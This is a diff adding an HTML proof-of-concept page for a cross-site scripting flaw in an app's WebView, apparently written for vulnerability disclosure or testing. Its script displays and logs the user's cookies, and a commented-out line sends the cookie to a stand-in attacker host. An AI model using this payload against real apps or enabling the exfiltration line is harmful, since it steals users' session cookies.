@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>XSS PoC - Wien App</title>
+</head>
+<body>
+    <h1>XSS Vulnerability Confirmed</h1>
+    <p>This page was loaded in the Wien App WebView without proper validation.</p>
+    
+    <script>
+        // Proof of JavaScript execution
+        alert('XSS Vulnerability Confirmed in Wien App WebView');
+        
+        // Demonstrate cookie access
+        var cookies = document.cookie;
+        if (cookies) {
+            alert('Cookies accessible: ' + cookies);
+        }
+        
+        // Log to console
+        console.log('XSS PoC executed successfully');
+        console.log('User-Agent:', navigator.userAgent);
+        console.log('Cookies:', document.cookie);
+        
+        // Send proof to attacker server (optional)
+        // fetch('https://attacker.com/log?poc=success&cookie=' + encodeURIComponent(document.cookie));
+    </script>
+    
+    <p>If you see this alert, the XSS vulnerability is confirmed.</p>
+</body>
+</html>
